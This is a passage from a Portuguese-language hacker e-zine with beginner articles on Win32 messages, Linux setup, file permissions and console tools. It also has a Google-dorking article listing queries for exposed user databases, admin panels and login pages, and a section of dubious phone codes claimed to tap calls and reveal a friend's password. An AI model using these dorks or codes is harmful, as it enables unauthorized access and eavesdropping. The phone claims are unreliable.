return DefWindowProc(hWnd,msg,wParam,lParam);
}

As mensagens  aí enviadas  correspondem, respectivamente,  à quando  a janela  é
finalizada e criada.

DefWindowProc corresponde  à uma  função que  recepta as  mensagens que  não são
processadas pela WinProc.  Os parâmetros são  os mesmos da  WinProc. Essa função
garante que todas as mensagens sejam receptadas de maneira correta.

return 0; geralmente funciona também ;]

As mensagens mais comuns são citadas a seguir com seus respectivos eventos:


WM_ACTIVATE
OnActivate, OnGetFocus, OnEnter

WM_ACTIVATEAPP, WM_KILLFOCUS
OnLostFocus, OnExit, OnDeactivate

WM_CLOSE
OnClose

WM_COPY
OnCopy

WM_CREATE
OnCreate, OnLoad

WM_CUT
OnCut

WM_DESTROY
OnDestroy

WM_ENABLE
OnEnable

WM_HELP
OnHelp

WM_KEYDOWN
OnKeyDown

WM_KEYUP
OnKeyUp

WM_KILLFOCUS
OnLostFocus, OnExit, OnDeactivate

WM_LBUTTONDNLCLK
OnDblClick (Botão esquerdo)

WM_LBUTTONDOWN
OnMouseDown (Botão esquerdo)

WM_LBUTTONUP
OnMouseUp (Botão esquerdo)

WM_MBUTTONDBLCLK
OnDblClick (Botão do meio)

WM_MBUTTONDOWN
OnMouseDown (Botão do meio)

WM_MBUTTONUP
OnMouseUp (Botão do meio)

WM_MOUSEMOVE
OnMouseMove

WM_MOUSEWHEEL
OnMouseWheel

WM_MOVE
OnMoved

WM_MOVING
OnMove

WM_PAINT
OnPaint, OnRepaint

WM_PASTE
OnPaste

WM_QUIT
OnTerminate

WM_RBUTTONDNLCLK
OnDblClick (Botão direito)

WM_RBUTTONDOWN
OnMouseDown (Botão direito)

WM_RBUTTONUP
OnMouseUp (Botão direito)

WM_SETFOCUS
OnActivate, OnGetFocus, OnEnter

WM_SIZE
OnResized

WM_SIZING
OnResizing, OnResize

WM_TIMER
OnTimer

WM_UNDO
OnUndo


A partir daí  você já está  apto a monitorar  suas próprias mensagens,  mas, por
enquanto, vamos montar um simples programa que não faça nada menos do que aquilo
que aprendemos até agora, exceto o uso da função API SetWindowText(HWND,char  *)
que modifica a string da barra de título da janela (Caption):



/*Programa simples de exemplo*/


#include <windows.h>
#pragma hdrstop      //diretiva de pré-processador

LRESULT CALLBACK WinProc(HWND,UINT,WPARAM,LPARAM);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR nCmdLine,
 int nCmdShow)

{
MSG msg;
WNDCLASSEX wnd;
wnd.cbClsExtra = 0;
wnd.cbSize = sizeof(WNDCLASSEX);
wnd.cbWndExtra = 0;
wnd.hbrBackground = (HBRUSH) COLOR_WINDOW;
wnd.hCursor = LoadCursor(NULL,IDC_ARROW);
wnd.hIcon = LoadIcon(NULL,IDI_APPLICATION);
wnd.hIconSm = LoadIcon(NULL,IDI_APPLICATION);
wnd.hInstance = hInstance;
wnd.lpfnWndProc = (WNDPROC) WinProc;
wnd.lpszClassName = "Janela";
wnd.lpszMenuName = NULL;
wnd.style = NULL;


if(!RegisterClassEx(&wnd)){PostQuitMessage(0);}

HWND handle = CreateWindowEx(NULL,"Janela","Janela de Exemplo",
WS_OVERLAPPEDWINDOW,150,150,300,300,GetDesktopWindow(),NULL,hInstance,NULL);


if(!handle){PostQuitMessage(0);}

ShowWindow(handle,nCmdShow);
UpdateWindow(handle);
while(GetMessage(&msg,NULL,0,0)){
TranslateMessage(&msg);
DispatchMessage(&msg);
}

return 0;

}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{


switch(Msg){
case WM_RBUTTONDOWN:
SetWindowText(hWnd,"Clique direito");
break;

case WM_LBUTTONDOWN:
SetWindowText(hWnd,"Clique esquerdo");
break;

case WM_MBUTTONDOWN:
SetWindowText(hWnd,"Clique com botão do meio");
break;

case WM_MOVE:
SetWindowText(hWnd,"Janela movida");
break;

case WM_SIZE:
SetWindowText(hWnd,"Tamanho modificado");
break;

case WM_KEYDOWN:
SetWindowText(hWnd,"Tecla pressionada");
break;

case WM_DESTROY:
PostQuitMessage(0);
}

return DefWindowProc(hWnd,Msg,wParam,lParam);

}


/*Fim do programa!

Este programa foi compilado em  Visual Studio 6.0. A macro  WIN_32_LEAN_AND_MEAN
foi utilizada,  embora não  tenha sido  citada aqui.  O programa  compilado está
disponível <a href=”www.skc2.kit.net\Ex01.exe”>aqui</a> e possui 152 KB.*/

Bom, agora  você já  sabe criar  uma janela  simples e  manipular as  principais
mensagens que podem  vir a ocorrer.  No próximo capítulo  entraremos em detalhes
nos  controles  simples  de  Windows,  e  ainda  veremos  alguns  parâmetros das
mensagens mais comuns e aprenderemos alguns truquezinhos ;]]



Xor´s para todos ;]





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 07 ]=-=[ Instalando o Linux pela 1ª vez ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Como vão Newbies?
   Isso é só um básico pra quem quer se aventurar no linux, mas não sabe como  e
não quer perder o rwindows por motivos de força maior... :)
   Se você tem  um HD de  20GB  e está  usando seu sistema  tudo numa  partição,
você teria   que  perder   tudo  se  quisesse  criar   uma  outra  partição. Mas
existem  programas  que  redimensionam  o   seu tamanho,   e  o  maior  destaque
neles, são  a facilidade e (in)segurança que eles proporcionam.

Vamos aos exemplos:
   Você tem extamente  10GB para seu  linux com um  PII 233Mhz e  64RAM. Baixe o
programa "Partition Star", que é menos  que 1MB de tamanho e tem  uma facilidade
tremenda. Baixe ele  em: http://www.star-tools.com/english/download.html. Até  o
término dessa edição ele se encontrava na versão 2.01.
   Após instalado o  programa, ele exibe  todas as partições  encontradas em sua
tabela de partição. Agora o resto é simples. Abra a partição em que se  encontra
o seu windows e diminua  o tamnho tanto em GB  como em %. De OK  para confirmar,
salve as alterações e reinicie o computador.
   Após  isto,  volte ao  programa  e clique  num  espaço em  branco  debaixo da
primeira partição sua, e veja que mostrará a quantidade total de espaço sobrando
na qual poderá ser transformada em uma outra partição.
   Dos 10GB, coloque 9,872GB e na hora de selecionar o file system, coloque  83
- Linux Native. Depois crie outra com o resto do espaço que sobrou: 128MB - e  o
file system 82 - Linux Swap.

   Salve as alterações, reinicie e comece  a instalar o linux bootando pelo  CD.
Ele reconhe as partições windows, linux native e swap!!!
   Agora vem a parte crítica. Nem tudo sai às 1000 maravilhas e vou citar alguns
problemas que enfrentei:

- Dá uma mensagem de erro quando se tenta diminuir o tamnho da partição.
   Isso é uma limitação que o  partition star possui. Para conseguir fazer  esse
redimensionamento, você deve primeiramente  desfragmentar o disco por  completo.
Por que? Para mover todos arquivos que se encontraram no final da unidade para o
começo, deixando assim o espaço livre.

- Quando abro o aplicativo aparece um erro de operação ilegal e nada acontece.
   Bem, isso geralmente acontece  por dois fatores: 1  - Seu anti-vírus está  em
execução ou algo parecido. 2 -  Alguns arquivos seus do windows podem  não estar
presentes ou corrompidos (novidade...). Mas  nessa versão 2.01 não ocorreu  esse
erro comigo. Mas de qualquer forma, você pode utilizar em modo DOS (PSDOS).

- Quando faço alguma alteração no C: ele não salva essas alterações.
   Isso geralmente  acontece porque  você está  usando o  C: nesse momento. Para
isso de  o boot  pelo disquete  e efetue  novamente as  alterações. Outro motivo
seria o anti-vírus.

- Como faço para criar esse boot pelo disquete?
   Ao abrir o programa clique em: File, Create Emergency Disk, e Finish. Agora é
só dar o boot pelo floppy na inicialização do sistema.

- Minhas partições não formatam e/ou dão erro na instalação do linux.
   Isso é decorrente de badblocks. A  única solução é você formatar checkando  o
disco inteiro para ele achar os possívei clusters danificados, ou se você  tiver
uma idéia de onde estão, isolar a área numa outra partição.

   É só galera,  só demonstrei o  básico desse programa  para windows pois  é de
fácil manuseio e bem pequeno. O melhor mesmo é o Partition Magic 8, que não se é
necessário nem  fazer a  desfragmentação. Mas  pra quem  não quer ficar baixando
30MB, o  partition star  é uma  ótima solução  custo/benefício. O  serial dele é
fácil de  achar na  net. Desculpem  por esse  texto bem  básico, mas  como é  só
voltado para  newbies que  querem migrar  de windows  para linux  de uma vez por
todas, embora muito ainda ficarão com o windows wm sua winchester.

   Espero   que agora   não deem   mais desculpas   para não  usar o  linux(fora
aquele do driver de modem). Abraços e juízo.


            []´s

            IP_FIX.





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 08 ]=-=[ Permissões de Arquivos ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

*** Permissões de arquivos e diretórios ***

Antes devemos saber que todas as  informações sobre os arquivos vem do  inode. O
inode guarda os  dados sobre o  UID e GID  do dono do  arquivo, permissões dele,
tipo e o timestamp do arquivo. (dados sobre a última modificação e etc..).

Vendo o inode --> basta dar um "ls -l"

exemplo:

[root@Jakk root]# ls -l

drwx------    3 root     root         4096 Out  4 02:55 Desktop
drwxr-xr-x    2 root     root         4096 Set 14  2001 backup
drwxr-xr-x    9 root     root         4096 Out 12 01:00 tmp

[root@Jakk root]#

São 3 níveis de permissões :
Dono: só pode ser 1, dono do arquivo
Grupo: membros de um determinado grupo
Outros: o resto dos usuários do sistema
As  permissões  so  são  apresentadas mesmo  depois  do  primeiro  bit na  ordem
"rwx".Este esquema  funciona da  seguinte forma,  depois do  primeiro bit, vem 3
bit's referentes as permissões do proprietário do arquivo; os 3 seguintes são do
grupo e os 3 últimos são do resto do sistema .


*** As permissões de fato ***

Vou mostrar as permissões básicas. São elas "r", "w" e "x".

*r --> Read
arquivo : pode ser lido
diretório : pode ser visto o seu conteúdo

*w --> write
arquivo : pode ser adicionado e alterar um arquivo
diretório : pode-se apagar ,criar e/ou modificar qualquer arquivo e/ou diretório
que esteja dentro desse diretório mesmo que este não tenha essa permissão

*r --> eXecute
arquivo : pode-se excutar o programa  ou shell script diretório : pode  "entrar"
no diretório. Essa tem um porém , porque nada adianta você ter uma permissão "w"
se nao tiver "x". Mas "r" sem "x" ainda pode-se ver o conteúdo com limitações


*** Alguns comandos ***

*chmod
O chmod serve para que você possa mudar as permissões de um arquivo(claro que vc
tem que ser o dono do arquivo ou root)

observe isso --> x = 1, w = 2, r = 4

essa relação é utilizada pra vc modificar as permissões dos arquivos

exemplo:    chmod 767 programa

Cada número corresponde a  um nível.Observe cada número  o primeiro número 7  eh
formado pela soma dos numéros correspondentes as permissões . 1(x) + 2(w) + 4(r)
= 7

Veja :    ,--------------,----------,
          |   permissão  | cálculo  |
          |--------------|----------|
          |    ---       |    0     |
          |    --x       |    1     |
          |    -w-       |    2     |
          |    -wx       |   2+1    |
          |    r--       |    4     |
          |    r-x       |   4+1    |
          |    rw-       |   4+2    |
          |    rwx       |  4+2+1   |
          '--------------'----------'

OBS.: Só é valida para as permissões "básicas" (rwx).

*ls

Exemplo:

4 drwx------    4 fernando fernando     4096 Out 12 01:20 Desktop
4 drwx------    8 fernando fernando     4096 Out 12 00:33 Mail
4 drwxrwxr-x    3 fernando fernando     4096 Set 28 13:23 OpenOffice.org1.0.2
4 drwxrwxr-x    9 fernando fernando     4096 Out 11 14:53 kvirc-3.0.0-beta2
4 drwxr-xr-x    2 fernando fernando     4096 Set 23 19:49 linux
4 drwxrwxr-x    8 fernando fernando     4096 Out 10 08:30 programas
4 drwx------    4 fernando fernando     4096 Out 11 23:29 tmp
4 drwxr-xr-x    8 201      201          4096 Set 23 11:36 vmware-distrib
4 drwxr-xr-x   22 1000     users        4096 Set 22 19:21 wine-20030911

Este 'd' no primeiro bit significa diretório.

veja as outras possibilidades

 ,--------------,------------------------------,
 |  Caractere   |       Significado            |
 |--------------|------------------------------|
 |     -        |     arquivo regular          |
 |     b        |   dispositivo de blocos      |
 |     c        | dispositivo de caracteres    |
 |     d        |        diretório             |
 |     l        |      symbolic link           |
 |     p        |          FIFO                |
 |     s        |         socket               |
 '--------------'------------------------------'

Bom eu fico por aqui espero que tenha sido interessante e compensador...

(Jakk®SN)(Nikiti-Rj)

- EOF -





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 09 ]=-=[ Programas em Modo Texto ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

PROGRAMAS PARA LINUX EM MODO TEXTO

by Green Hornet


Escrevo  esse texto  pensando naqueles  que estão  iniciando no  Linux, -como  o
IP_FIX colocou que o objetivo inicial  do MOTD eh começar com txts  voltados pro
pessoal newbie(quase lammer :-) -.
Que conseguiram  instalar o  sistema,mas que  ainda se  sentem perdidos  e estão
procurando programas que executem tarefas semelhantes as que usavam no windows.

O detalhe eh que  darei enfase só em  softs que rodam pelo  shell(modo texto) ja
que esse eh um dos grandes medos de quem ta começando.
Alguem pode perguntar porque não falar de programas de interface grafica?
Amigo,como geralmente as pessoas estão  mais habituadas ao ambiente de  janelas,
creio ser mais intuitivo do que trabalhando pelo console.

Alem do que muitas interfaces graficas dependem de um bom hardware para  rodarem
satisfatoriamente,como o kde por exemplo.
Ja pelo prompt,voce pode rodar ate naqueles 486 velhos e com 8 de ram :-)
Lembrando que os programas aqui citados estao com enfase na distribuicao Slackware.

Caso sua distro não tenha algum  desses programas,basta ir a algum desses  sites
na net(freshmeat.org, sourceforge.net, linuxpackages.org, rpmfind.net...)

O  primeiro item  importante para  voce trabalhar  pelo prompt  eh habilitar  o
recurso de GPM na instalação,que permite usar o mouse pelo shell.
Outro fator eh habilitar o frame-buffer do terminal,isso pode ser feito editando
o arquivo de configuracao do lilo (/etc/lilo.conf).

Segue uma tabela pra voce usar o que for mais adequado :

vga=791 : 1024x768, 16 bits de cor.
vga=790 : 1024x768, 15 bits de cor
vga=773 : 1024x768, 8 bits de cor
vga=788 : 800x600, 16 bits de cor
vga=787 : 800x600, 15 bits de cor
vga=771 : 800x600, 8 bits de cor
vga=785 : 640x480, 16 bits
vga=784 : 640x480, 15 bits
vga=769 : 640x480, 8 bits.

depois de edita-lo,digite lilo (como root).

Uma prova de que esta funcionando  bem e quando aparecer o Tux(pinguim)no  canto
superior esquerdo assim que a maquina inicializar o Linux.



                                    INTERNET


PARA CONECTAR NA NET SEM USAR DISCADORES**:

Minha primeira dica é para se conectar  à Internet usando chat + pppd, ou  seja,
sem a necessidade de discadores como WvDial e kPPP.

Exemplo do provedor iG:

Crie   os   arquivos    /etc/ppp/iG,   /etc/ppp/options,   /etc/pap-secrets    e
/etc/ppp/peers/iG com o seguinte conteúdo:

/etc/ppp/iG

TIMEOUT 3
ABORT BUSY
ABORT ERROR
ABORT "NO ANSWER"
ABORT "NO DIALTONE"
REPORT CONNECT
"" "AT&F1"
OK "ATDT15002000"
TIMEOUT 120
CONNECT

Se necessário, modifique AT&F1 (string  de inicialização) e 15002000 (número  de
telefone).

/etc/ppp/options

ttyS1
115200
chap-max-challenge 100
crtscts
defaultroute
holdoff 5
lcp-echo-failure 10
lcp-echo-interval 60
lock
persist
usepeerdns


Obs: * ttyS1 = COM2


/etc/pap-secrets

"ig" * "ig"

O primeiro 'ig' contém o login, o segundo a password.

/etc/ppp/peers/iG

connect '/usr/sbin/chat -f /etc/ppp/iG'
name ig

* 'ig' = login


Digite:
ln -sf /etc/resolv.conf /etc/ppp/resolv.conf

Digite:

alias iG='/usr/sbin/pppd call iG'

Digite iG para conectar. Digite kill -INT `cat /var/run/ppp0.pid` para desconectar.
Não é necessário ser root.


Default:

Discar no máximo 100 vezes, uma a cada 5s.
Desconectar após 10 vezes sem reposta do link, uma a cada 60s.
Obviamente  para esse  script funcionar  eh necessario  que o  Sistema ja  tenha
reconhecido o seu modem, para esse assunto recomendo a leitura de um txt do Nash
que fala sobre modems.



                                    BROWSERS


Para ver paginas  da net(Browsers) recomendo  o links e  o lynx,essa eh  a dupla
mais conhecida. O lynx suporta melhor scripts,tabelas,javascripts e outros.
Mas você pode usar o links com recurso de imagens,isso mesmo você pode ver

URLs com as fotos e outros!!,para isso precisara instalar a lib: aalib.tar.gz
(http://aa-project.sourceforge.net/aalib/)

descompactar (tar -zxvf <aalib...>, entrar na pasta onde foi colocado as libs  :
cd  <aalib...>,  digitar:  ./configure,  depois :  make,  e  por  ultimo :  make
install(como root).

E depois instalar uma versão mais nova do links,pegue uma versao em codigo fonte
e quando for compilar,use ./configure --enable-gui. Dai quando for abrir o links
basta usar

links -g http://cdm.frontthescene.com.br ,que você vera o site com as suas imagens.

Para abrir menu,tecle ESC. Dai voce tera varias opcões.

Para ir para outra URL digite "g", e digite o site desejado.
Para sair do links tecle "q".
Para inserir no bookmarks tecle "s".
Para voltar "z".
Para abrir o history ">".


                                      IRC


Para IRC um dos mais usados eh o BitchX,

Seus comandos basicos sao:

Para entrar num canal        : BitchX nick irc.servidor.com
entrar no canal                   : /j #canal
sair do canal                       : /part #canal
abre um pvt com                 : /q <nick>
manda msg para nick ou canal : /m <nick/#canal>
exibe info sobre             : /whois <nick>
exibe end. de dns            : /dns <nick>
exibe versao do BitchX       : /sv <nick/#canal>
manda/recebe arquivos        : /dcc <comando> #nick
abre um dcc chat com         : /chat <nick>
da op a usuario              : /op <nick>
tira op de um usuario        : /deop
muda topico                  : /t <novo topico>
kicka um usuario             : /k <nick>
kicka e bane                 : /kb <nick>
desbane                      : /unban <nick>
exibe nicks do canal         : /scan
desconectar                  : /quit


                                      ICQ


Uma opcao eh o centericq(http://konst.org.ua/eng/software/centericq/info.html)

ele eh um  cliente de ICQ,AIM,MSN,Yahoo.Não  tem suporte a  mouse, mas de  facil
utilizacao.Existe tambem o micq.
E outras opcoes,basta ir naqueles sites que recomendei no inicio.




                                     EMAILS

Existem varios clientes de emails,como o elm,pine,mutt.

Explicarei o basico sobre  o Pine(apesar de que  acho melhor no inicio  a pessoa
usar outros clientes como o mozilla mail ou evolution).

Digite "pine"

Abrira um menu dai va no Setup.
tecle "C"(Config)
Dai você vai configurar o servidor necessario  como o de SMTP e as outras  infos
pessoais como username e etc...
Para sair do config tecle "E".
Para escrever mensagem,va no opção de menu "Compose Message".
Para ler mensagens abra a opção "MESSAGE INDEX".
A opção "A" para adicionar enderecos de email no seu bookmarks.
Para sair basta ir na ultima opção do menu principal "QUIT".
Recomendo antes da configuração a leitura do Help -a primeira opção do menu principal-.

Vale dizer que muitos desses clientes de email precisam que você esteja com  seu
DNS configurado.




                                    IMAGENS

Para ver imagens pelo  console um bom programa  eh o seejpeg, para  ver uma foto
basta usar: seejpeg <nome da foto.jpg>. para sair tecle "q".




                                  MP3 E AUDIO

Para tocar mp3 o  meu preferido eh o  mpg123,para executar basta colocar  mpg123
<nome da musica.mp3>

Para editar o som  uma opcão eh o  rexima (aparecera um equalizador  e la podera
configurar a vontade com as setas)depois para sair basta digitar "q". Outro  com
as mesmas funções do rexima e o aumix.

Se quiser ouvir cds de audio um programa muito bom eh o workbone, basta  digitar
"workbone" no shell e colocar o cd,que ele reconhecera automaticamente.

Os principais comandos para ele sao:

Para tocar digite: "9"
Para pause/resumo: "8"
Para parar: "7"
Para pular faixa: "6"
Para repetir faixa: "5"
Para ir faixa anterior: "4"
Para ir a frente 15': "3"'
Para abortar(hard abort): "2"
Para voltar: 15' "1"
Para sair: "0"
Para ajuda : "."



                             GERENCIADOR DE ARQUIVO

Como gerenciador de  arquivo um classico  eh o mc  (Midnight Commander), ele  eh
leve,robusto e tem muitos recursos.

Para abri-lo basta digitar "mc".
Para andar pelos arquivos use as setas.
Embaixo tem um menu indicando as opcões que voce pode usar (help,menu,view,edit...)

Lembrando que essas opcoes se referem as teclas do F1,F2,F3...
Para visualizar um texto por exemplo,basta parar com o cursor emcima dele e teclar "F3".
Para abrir o menu de cima,tecle "F9".
Para sair tecle "F10".
Usando ele regularmente vera que ele eh bem pratico e rapido comparado a  outros
gerenciadores.



                                GRAVACAO DE CD'S

Para gravar cds existem algumas opcoes as principais sao o cdrecord e o bladeenc.
Primeiro para usar o seu gravador no Slackware voce deve recompilar seu kernel.
As opcoes sao para SCSI,ATAPI,IDE e de porta paralela.Depois recompile o kernel.
Depois disso para as gravadoras IDE/ATAPI,adicione essas linhas ao arquivo

/etc/modules.conf:

#alias scd0 sr_mod
#alias scsi_hostadaptor
ide-scsi
#options ide-cd
ignore=hdd

Depois reinicialize o Linux e digite:

#modprobe scd0
#modprobe scsi_hostadaptor

Reinicialize novamente e digite:

#cdrecord -scanbus

Dai surgira seu gravador de cd e o numero de dispositivo dele.
Esse comando vai te dar o  numero de dispositivo dele.Que você precisara  quando
for gravar.Adicionara o numero na opção "dev"


Para gravar

Existe duas formas de gravar

criando uma ISO ou criando a imagem e inserindo diretamente no cd.

Para criar IMAGEM no cd,digite :

#mkisofs -r -o <nome da imagem> diretorio de arquivos


#Montagem de ISO

#mount -t iso9660 -o ro loop=/dev/loop0 nome_da_imagem/diretorio_de_montagem


Queimando o cd:

#cdrecord -v speed=4 dev=0,0,0 -data nome_da_imagem


Em discos regravaveis adicione a opção blank fast:

#cdrecord -v speed=4 dev=0,0,0 blank=fast -data nome_da_imagem


Para gravação direta:


#IMG_SIZE='mkisofs -R -q -print-size diretorio_dos_arquivos/ 2 >&1 | sed -e "s/.*=//"'
#echo $IMG_SIZE
#["O$IMG_SIZE" -ne 0 ] &&
#mkisofs -r diretorio_dos_arquivos/ |
#cdrecord speed=2 dev=0,6,0 tsize=${IMG_SIZE}s -data-



                                PARA LER TEXTOS

Para isso voce pode simplesmente usar os programas less,more ou cat.





                               EDITORES DE TEXTOS

Para editor de textos:

Ai entramos numa area  em que o Unix  eh imbativel!Porque alem de  termos muitas
opcoes,  voce  pode  usar  excelentes  ferramentas.Hoje  vo  escrever  sobre   o
VI(pronuncia VI-AI).

Mas existem outros como o Tradicional Emacs,o Joe,Pico,Jed...

O vi eh muito mais que um editor de textos.

Para abrir um texto nele,use vi <nome do arquivo>, Para inserir texto tecle "i".
Para caminhar pelo texto use as setas quando terminar o texto tecle ESC
Para sair do texto use :q(com ":").
Para salvar            :w
Para sair e salvar     :wq (outro atalho para isso tecle ZZ)
Para alterar nome      :w <novo nome>

Isso eh o basico do basico,depois espero me aprofundar no uso desses editores.




Bom, por enquanto eh isso!!

Esse texto tambem  teve a intenção  de mostrar que  (ao contrario do  que muitos
pensam)voce  pode fazer  quase tudo  pelo prompt,  alem do  que mostrei  existem
outros recursos, como assistir filmes (pelo mplayer),jogar (existe varias opções
ate mesmo o Quake2!!) e caso precise de uma interface grafica leve, recomendo  o
BlackBox, Fluxbox e a brasileira WindowMaker.

Espero que esse texto seja util para alguem.
Se depender de mim sera o primeiro de muitos para esse grupo.

Quero agradecer ao pessoal que tem me  apoiado do CDM e do MOTD, em  especial ao
Nash Leon,o IP_FIX e ao inferninh0.

GreenHornet (moyfalela@ig.com.br)

Brasnet
#motd  #mercenaries

**Obs:não fui eu que criei  esse script(o de conectar pelo  iG),mas sinceramente
não  lembro  de onde  o  peguei,se o  autor  quiser,pode entrar  em  contato que
atualizarei dando os devidos creditos.


                                                            "YESHUA HAMASHIAH!!!"





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 10 ]=-=[ Hackeando pelo Google ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Google como ferramenta hacker !


Bom, que o google.com ja foi parte fundamental em varios hackings famosos  quase
todo mundo ja sabe... o problema eh que nunca encontrei um artigo que explicasse
como eh possivel transformar o google.com em uma poderosa ferramenta hacking.

Por este motivo decidi escrever um artigo basico sobre isto.

"allinurl:usuarios.mdb  site:.com.br"  busca  por  arquivos  de  banco  de dados
nomeados "usuarios.mdb" dentro do dominio mae ".com.br"

"allintitle:admin panel site:.org" busca  por supostas paginas de  administracao
dentro do dominio ".org"

"allinurl:login.asp"

lista todas  as paginas  com nome  de "login.asp",  e em  alguns casos  o google
exibira uma versao "cache" da pagina onde sera possivel ver o codigo asp.


Bom façam bom proveito e espero que tenham gostado do artigo .


Abraços BlackSheep182





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 11 ]=-=[ Códigos para Celulares ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Código 1: Grampeando ligações.(funciona só em aparelhos ericsson, CDMA , do t18d
para tras...)

Esse  código é  muito legal  galera... eu  mijo de  rir com  as coisa  que jah
escutei... ele é facim facim de fazer... soh que se você pular alguma coisa, bye
bye celular...
Ok, chega de bla bla bla...


1 - Ligue o celular(dããã)
2 - Digite 904059 e setinha p/ baixo.(akela qur vai pro menu)
3 - Digite YES , 1, seta cima
4 - Digite YES , 2 , seta cima
5 - Digite YES 86
6 - Digite YES, 3, CLR , 000995

Agora você ta escutano um chiado... logo logo grampeia uma ligação, fica frio...

DETALHE IMPORTANTE - Você só vai conseguir sair disso digitando o codigo: YES  3
seta cima.


Codigo 2: Mudando a porra do nome da operadora que aparece na telinha do cel...
(só funciona nos mesmos cels do codigo 1...)

1-Digite 987 + seta p/ baixo...
2-Se aparecer um  treco escrito: program  nam 1-2 ,  vc digita 1.Ae  vc começa a
descer com a tecla  da seta p/ baixo...  até aparecer o nome  da operadora...(se
nao me engano, aparece na quarta vez q  vc aperta a seta p/ baixo...) Ae eh  soh
vc editar, colocar o nome q quiser, e dar YES.


Codigo 3: Vendo a  senha do seu amiguinho,  e se fuçar um  pouco +, acaba com  o
celular dele ... puts... eheehhe
(Funciona só nos celz tipo nokia 3320)

1-Digite *3001#12345#

Pronto, entro nele... ae vai em security e ve a senha... pra sair tem q  desliga
o  cel... lembrando,  se vc  fuçar um  pokim, vc  acaba com  o celular  do seu
amiguinho...


Bom, é só isso...
Flw

Caiobat





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 12 ]=-=[ Introdução ao Hacking Ético ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#############################################################################
############################## UNSEKURITY TEAM ##############################
#############################################################################

IP_FIX: Atual Clube dos Mercenários, http://cdm.frontthescene.com.br

Desenvolvido por Nash Leon vulgo coracaodeleao.
nashleon@yahoo.com.br
Thanks Unsekurity Team.

Este e outros tutoriais podem ser obtidos em:
http://unsekurity.virtualave.net/

OBS: Nao nos responsabilizamos pelas informacoes aqui contidas, bem como
     do mau uso dos exemplos e dados aqui fornecidos.Todo material
     disponivel neste arquivo possui somente propositos educacionais.


OBS2: Isso aqui nao eh um zine, nem pretende se tornar.Trata-se apenas de
      um tutorial basico voltado para o pessoal NewBie, se voce eh 'elite',
      por favor, nao leia! Voce nao encontrarah informacoes uteis aqui.


---------------
1 - INTRODUCAO |
---------------

Demorou, mais aih estah a uniao de varios topicos de programacao relacionados ao
mundo fucador.Topicos  basicos, mas  que requerem  conhecimentos em  C e  Linux.
Resolvi incorporar a este tutorial uma parte com manifestos sobre varios  temas,
nao pretendo despertar odio com isso e sim, abrir a discussao em torno de alguns
pontos 'nao-tecnicos' que envolvem o mundo do fucador.Cada item do tutorial  tem
como  alvo  os  mesmo  leitores dos  tutoriais  anteriores,  ou  seja, Fucadores
NewBies. Fica avisado novamente que se voce eh 'elite' nao acharah nada util
neste tutorial.

----------------
2. - MANIFESTOS |
----------------

OBSERVACAO: OS PENSAMENTOS EXPRESSOS NESTE ITEM SAO DE MINHA AUTORIA,
	    SAO DE MINHA PESSOA.O UNSEKURITY TEAM DAH AOS SEUS MEMBROS A
	    LIBERDADE PARA SE EXPRESSAR DA MANEIRA QUE BEM ENTENDER.NO
	    ENTANTO, CADA MEMBRO POSSUI SEU PROPRIO MODO DE VER AS COISAS.
	    AS COISAS QUE ESCREVO AQUI NAO SAO COMPARTILHADAS POR TODOS
	    DO UNSEKURITY TEAM, E A RESPONSABILIDADE PELAS LINHAS QUE
	    SE ENCONTRAM NESTE ITEM CABE A MINHA PESSOA, NASH LEON,
	    ESTANDO DESDE JAH CLARO QUE EH UMA ATITUDE ISOLADA! AVISO
	    AO LEITOR QUE ELE NAO DEVE JULGAR O UNSEKURITY TEAM ATRAVES
	    DAS PALAVRAS E PENSAMENTOS DE UM SOH MEMBRO.


"Conhecereis a verdade e ela vos libertarah"

"De  que adianta  ter um  excelente conhecimento  tecnico sobre  o hacking,  mas
seguir por  caminhos detestaveis  pela comunidade  hacker???".O que  quero nesta
parte  eh compartilhar  um pouco  da minha  opiniao sobre  alguns assuntos  nao
-tecnicos, mas que envolvem  o mundo do fucador.Nao  adianta nada eu escrever  2
mil linhas de textos tecnicos para um cara se tornar cracker ou ser moldado como
